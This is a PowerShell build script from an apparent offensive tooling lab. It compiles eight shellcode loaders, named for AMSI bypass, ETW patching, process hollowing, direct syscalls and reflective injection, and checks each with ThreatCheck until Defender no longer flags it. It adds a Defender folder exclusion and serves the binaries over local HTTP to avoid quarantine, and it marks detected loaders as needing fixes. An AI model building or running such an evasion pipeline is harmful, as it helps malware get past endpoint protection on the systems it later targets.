# compile_and_check.ps1
# Run on Windows dev box (ammulu, 192.168.10.150).
# Compiles all 8 shellcode-embedded loaders and runs ThreatCheck on each output.
#
# Requirements:
#   - Python3 in WSL (to run embed_shellcode.py first)
#   - dotnet 6+ installed
#   - ThreatCheck.exe at the path below
#   - HTTP server running in WSL on port 8081 serving the embedded_out directory
#     (python3 -m http.server 8081 --directory /mnt/c/.../lab/loaders/embedded_out)
#
# STEP 1: In WSL, run:
#   python3 /mnt/c/Users/adversary/Desktop/ModernEvasion/lab/scripts/embed_shellcode.py
#
# STEP 2: Run this PowerShell script from the dev box.

$BaseDir    = "C:\Users\adversary\Desktop\ModernEvasion"
$EmbedDir   = "$BaseDir\lab\loaders\embedded"
$OutDir     = "$BaseDir\lab\loaders\embedded_out"
$ThreatCheck = "$BaseDir\lab\tools\ThreatCheck\bin\Debug\net8.0-windows\win-x64\ThreatCheck.exe"
$HttpBase   = "http://127.0.0.1:8081"

# Defender exclusion so build output is not quarantined on write.
# This does NOT disable Defender - only adds this one folder.
Write-Host "[*] Adding Defender exclusion for output folder..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $OutDir -ErrorAction SilentlyContinue

New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

# Each loader needs a separate dotnet project to compile.
# Project template: Console app targeting net8.0-windows with unsafe blocks allowed.
$CsprojTemplate = @'
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0-windows</TargetFramework>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <Nullable>disable</Nullable>
    <ImplicitUsings>disable</ImplicitUsings>
  </PropertyGroup>
</Project>
'@

# Map: loader filename -> output exe name -> project dir name
$Loaders = @(
    @{ Src="01_shellcode_loader.cs";      Out="loader01.exe";    Dir="proj_01" },
    @{ Src="02_xor_encoder.cs";           Out="loader02.exe";    Dir="proj_02" },
    @{ Src="03_direct_syscalls_loader.cs";Out="loader03.exe";    Dir="proj_03" },
    @{ Src="04_amsi_bypass.cs";           Out="loader04.exe";    Dir="proj_04" },
    @{ Src="05_reflective_injector.cs";   Out="loader05.exe";    Dir="proj_05" },
    @{ Src="06_process_hollowing_alt.cs"; Out="loader06.exe";    Dir="proj_06" },
    @{ Src="07_etw_patch.cs";             Out="loader07.exe";    Dir="proj_07" },
    @{ Src="08_combined_evasion.cs";      Out="loader08.exe";    Dir="proj_08" }
)

$Results = @()

foreach ($L in $Loaders) {
    $SrcPath  = "$EmbedDir\$($L.Src)"
    $ProjDir  = "$OutDir\$($L.Dir)"
    $ExePath  = "$OutDir\$($L.Out)"
    $ExeUrl   = "$HttpBase/$($L.Out)"

    Write-Host ""
    Write-Host "=== $($L.Src) ===" -ForegroundColor Yellow

    # Check source exists
    if (-not (Test-Path $SrcPath)) {
        Write-Host "  [-] Source not found: $SrcPath" -ForegroundColor Red
        $Results += [PSCustomObject]@{ Loader=$L.Src; Compiled=$false; ThreatCheck="SKIP" }
        continue
    }

    # Create project directory
    New-Item -ItemType Directory -Force -Path $ProjDir | Out-Null

    # Write the .csproj file
    $CsprojTemplate | Out-File -FilePath "$ProjDir\loader.csproj" -Encoding UTF8

    # Copy the source file as Program.cs
    Copy-Item -Path $SrcPath -Destination "$ProjDir\Program.cs" -Force

    # Compile
    Write-Host "  [*] Compiling..." -ForegroundColor Cyan
    $CompileResult = & dotnet build "$ProjDir\loader.csproj" -c Release -o "$ProjDir\out" --nologo 2>&1
    $CompileOk = ($LASTEXITCODE -eq 0)

    if (-not $CompileOk) {
        Write-Host "  [-] Compile FAILED" -ForegroundColor Red
        Write-Host ($CompileResult | Select-String "error" | Out-String)
        $Results += [PSCustomObject]@{ Loader=$L.Src; Compiled=$false; ThreatCheck="SKIP" }
        continue
    }

    # Find the compiled exe
    $CompiledExe = Get-ChildItem -Path "$ProjDir\out" -Filter "*.exe" | Select-Object -First 1
    if (-not $CompiledExe) {
        Write-Host "  [-] No .exe found in output" -ForegroundColor Red
        $Results += [PSCustomObject]@{ Loader=$L.Src; Compiled=$false; ThreatCheck="SKIP" }
        continue
    }

    # Copy to output dir with clean name
    Copy-Item -Path $CompiledExe.FullName -Destination $ExePath -Force
    Write-Host "  [+] Compiled: $ExePath" -ForegroundColor Green

    # Run ThreatCheck via HTTP (avoids Defender quarantine on file read)
    # We need a simple HTTP server in WSL serving $OutDir on port 8081.
    # In WSL: python3 -m http.server 8081 --directory /mnt/c/Users/adversary/Desktop/ModernEvasion/lab/loaders/embedded_out
    Write-Host "  [*] Running ThreatCheck (via HTTP)..." -ForegroundColor Cyan

    $TCOutput = & $ThreatCheck -u $ExeUrl 2>&1
    $TCResult = $TCOutput | Out-String

    if ($TCResult -match "No threat found") {
        Write-Host "  [+] ThreatCheck: CLEAN" -ForegroundColor Green
        $Results += [PSCustomObject]@{ Loader=$L.Src; Compiled=$true; ThreatCheck="CLEAN" }
    } elseif ($TCResult -match "threat found at offset") {
        # Extract the offset
        $OffsetLine = ($TCResult -split "`n") | Where-Object { $_ -match "threat found at offset" } | Select-Object -First 1
        Write-Host "  [-] ThreatCheck: DETECTED - $OffsetLine" -ForegroundColor Red
        $Results += [PSCustomObject]@{ Loader=$L.Src; Compiled=$true; ThreatCheck="DETECTED: $OffsetLine" }
    } else {
        Write-Host "  [?] ThreatCheck output:" -ForegroundColor Magenta
        Write-Host $TCResult
        $Results += [PSCustomObject]@{ Loader=$L.Src; Compiled=$true; ThreatCheck="UNKNOWN: $TCResult" }
    }
}

# Summary table
Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "RESULTS SUMMARY" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
$Results | Format-Table -AutoSize

$Clean    = ($Results | Where-Object { $_.ThreatCheck -eq "CLEAN" }).Count
$Detected = ($Results | Where-Object { $_.ThreatCheck -like "DETECTED*" }).Count
Write-Host ""
Write-Host "Clean: $Clean / $($Results.Count)" -ForegroundColor Green
if ($Detected -gt 0) {
    Write-Host "Detected: $Detected (need fixing)" -ForegroundColor Red
}
